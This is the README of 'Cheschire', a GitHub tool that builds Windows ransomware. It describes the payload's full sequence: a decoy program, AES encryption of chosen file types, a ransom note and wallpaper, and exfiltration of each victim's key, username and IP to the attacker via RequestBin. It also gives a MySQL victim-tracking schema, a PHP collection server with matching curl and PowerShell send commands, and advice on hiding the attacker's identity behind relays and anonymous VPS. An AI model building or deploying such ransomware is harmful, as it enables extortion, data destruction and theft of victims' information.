# Cheschire

[![Version](https://img.shields.io/badge/Version-1.0-blue.svg?style=for-the-badge)]()
[![Language](https://img.shields.io/badge/Bash-4.2%2B-brightgreen.svg?style=for-the-badge)]()
[![Available](https://img.shields.io/badge/Available-Debian-orange.svg?style=for-the-badge)]()
[![Download](https://img.shields.io/badge/Size-260K-brightgreen.svg?style=for-the-badge)]()
[![License](https://img.shields.io/badge/License-GPL%20v3%2B-red.svg?style=for-the-badge)](https://github.com/hacknonym/Cheschire/blob/master/LICENSE)

### Author: github.com/hacknonym

## A Windows Ransomware

![Banner](https://user-images.githubusercontent.com/55319869/87875498-d65d2d80-c9d1-11ea-98af-b7b989868d0a.PNG)

**Cheschire** generate executable ranwomware for Windows target. #cheschire #ransomware
# Using the AES encryption algorithm powershell module from https://github.com/thelinuxchoice/hidden-cry.git

## Legal disclaimer

Usage of **Cheschire** for attacking targets without prior mutual consent is illegal.
Do not use in military or secret service organizations, or for illegal purposes.
It's the end user's responsibility to obey all applicable local, state and federal laws. 
Developer assume no liability and is not responsible for any misuse or damage caused by this program.

## Features !
 - Specify location where to start encryption *e.g. ($home)*
 - Specify a specific extension *e.g. (.cheschire)*
 - Specify a ransom amount
 - Specify a Bitcoin address
 - Specify a decoy program *e.g. (avast antivirus)*
 - Specify a specific wallpaper
 - Specify speficic extensions *e.g. (.jpg, .docx)*
 - Specify a icon for the main program

## Installation and Usage
Necessary to have root rights
```bash
git clone https://github.com/hacknonym/Cheschire.git
cd Cheschire
sudo chmod +x displaydb.sh
sudo chmod +x listener.sh
sudo chmod +x cheschire.sh
sudo ./cheschire.sh
```
To compile the generated files, use [**Bat_to_Exe_Convertor**.](https://bat-to-exe-converter-x64.en.softonic.com/) 

## Operating steps
**Ransomware (.exe) steps**
- Move to the directory ``` %APPDATA% ```
- Launch of the integrated decoy program, *e.g. avast.exe*
- Creation of the directory ``` %USERPROFILE%\Documents\WindowsPowerShell\Modules\Cipher ```
- Move to the directory ``` %USERPROFILE%\Documents\WindowsPowerShell\Modules\Cipher ```
- Creation of the file __Cipher.psm1__
- Random generation of an identifier of the form {xxx-xxx-xxx}
- Creation of the file __cry.ps1__
- Launch of the file __cry.ps1__
  * Random generation of a secret key, *e.g. o6nklwri0s4d39hc7gxmzv5qlgy1xc4eu3a2dr7h8i0=*
  * Encoding information in Base64
  * Sending the encoded information (secret key, ID, Date, Time, Username, Computer Name, Public IP) to the hacker via [RequestBin](https://requestbin.io/)
  * Import module __Cipher.psm1__ and start encryption on the specified extensions
- Move to the directory ``` %USERPROFILE%\Desktop ```
- Creation of the file __readme.html__
- Launch of the file __readme.html__
- Copy the file ``` %APPDATA%\decrypt0r.exe ``` to ``` %USERPROFILE%\Desktop\ ```
- Changing the wallpaper with ``` %APPDATA%\wallpaper.jpg ```
- Deleting files embedded in ``` %APPDATA% ``` (avast.exe, wallpaper.jpg, decrypt0r.exe)

**decrypt0r.exe steps**
- Creation of the directory ``` %USERPROFILE%\Documents\WindowsPowerShell\Modules\decry ```
- Move to the directory ``` %USERPROFILE%\Documents\WindowsPowerShell\Modules\decry ```
- Creation of the file __decry.psm1__
- Creation of the file __decryGUI.ps1__
- Launch of the file __decryGUI.ps1__
  * Opening a graphic window (GUI) to enter the secret key
  * If the field is not empty then we try to decrypt the files and if the files have been decrypted then delete the files (decry.psm1, decryGUI.ps1) in ``` %USERPROFILE%\Documents\WindowsPowerShell\Modules\decry ``` otherwise if the field is empty or the key incorrect, nothing happens (closing the window)
  
## Using MySQL DataBase
Creating a new user
```bash
mysql> CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password';
mysql> GRANT ALL PRIVILEGES ON Cheschire.* TO 'newuser'@'localhost';
```
Once the new user has been created, specify credentials in the **ident.txt** file
<br />**Default credentials**
```text
DBNAME : Cheschire
USERNAME : root
PASSWORD : 
```

DATABASE NAME: **Cheschire**
| TABLES |
|  :------:  |
|  Victim  |
|  Country |

**Victim** TABLE
| Field | Type | Null | Key | Default | Extra |
| --- | --- | --- | --- |--- |--- |
| Id_Victim | int(11) | NO | PRI | NULL | auto_increment |
| Date_Compromise | datetime | YES | --- | NULL | --- |
| IP_Address | varchar(15) | YES | --- | NULL | --- |
| ISP | text | YES | --- | NULL | --- |
| Country | varchar(2) | YES | MUL | NULL | --- |
| Region | text | YES | --- | NULL | --- |
| City | text | YES | --- | NULL | --- |
| Timezone | varchar(100) | YES | --- | NULL | --- |
| User_Name | varchar(50) | YES | --- | NULL | --- |
| Computer_Name | varchar(50) | YES | --- | NULL | --- |
| Ident | varchar(17) | YES | --- | NULL | --- |
| Secret_Key |  varchar(45) | YES | --- | NULL | --- |

**Country** TABLE
| Field | Type | Null | Key | Default | Extra |
| --- | --- | --- | --- |--- | --- |
| Id_Country | varchar(2) | NO | PRI | NULL | --- |
| Name | varchar(60) | NO | --- | NULL | --- |

## Why use RequestBin to send information
It is quite possible to send the information through an HTTP request directly to our server without going through a service provider
**index.php**
```php
<?php
if(isset($_GET["query"])){
    $file = fopen("output.txt", "a+");
    fwrite($file, $_GET['query']."\n");
}
?>
```
Launch the server
```bash
$> php -S 0.0.0.0:8080
```
Send a request from Windows (Command Prompt & PowerShell)
```PowerShell
cmd> curl http://<IP_SERVER>:8080/?query=Hello World

PS> (New-Object System.Net.WebClient).DownloadString("http://<IP_SERVER>:8080/?query=" + "Hello World")
```
However for the victim to be able to send information, our server must be accessible
by Internet (if not on the same local network). But by making accessible
the server from the Internet, we expose ourselves to risks concerning our identity.
Indeed, if the victim analyzes his outgoing connection logs, the public IP address of the
remote server (our HTTP server) will be displayed in plain text while sending information.

## Why use Bat_to_Exe_Convertor to compile
For all this to work, we need to have 3 files
- the decryption program (.exe)
- a wallpaper (.jpg)
- a decoy program (.exe)

It is impossible to integrate these three files inside an executable (e.g. in a
C program), it would then be necessary to download them from the Internet
on the target machine (if not on the same local network), but it would be necessary
to take adequate measures regarding the anonymity of the server from which these
files would be downloaded, in this case it is therefore imperative to use
- Relay servers
- Anonymous VPS
- External service providers (e.g. https://www.mediafire.com/, http://ge.tt/, etc.)

In addition, this does not exclude a potential blockage of certain
ports, services, IP addresses due to a firewall, which would prevent us from
download our files.

## Tools Overview
![Create Ransomware](https://user-images.githubusercontent.com/55319869/87853921-5ae67800-c90e-11ea-9c51-f1d5bacc8fdf.png)
![Check & Compile info](https://user-images.githubusercontent.com/55319869/87853923-5c17a500-c90e-11ea-8fb6-c4881e41f270.png)
![DATABASE interactions](https://user-images.githubusercontent.com/55319869/87853925-5d48d200-c90e-11ea-9712-4a5dbb8defe6.png)
![List victims from the DATABASE](https://user-images.githubusercontent.com/55319869/87853926-5e79ff00-c90e-11ea-80a9-730a1275804e.png)
![Number of victims](https://user-images.githubusercontent.com/55319869/87853928-5fab2c00-c90e-11ea-81ec-f220e7daf716.png)
![Instructions](https://user-images.githubusercontent.com/55319869/87875372-2091df00-c9d1-11ea-9e25-59b2647b3bb7.png)

## License
GNU General Public License v3.0 for Cheschire
AUTHOR: @hacknonym

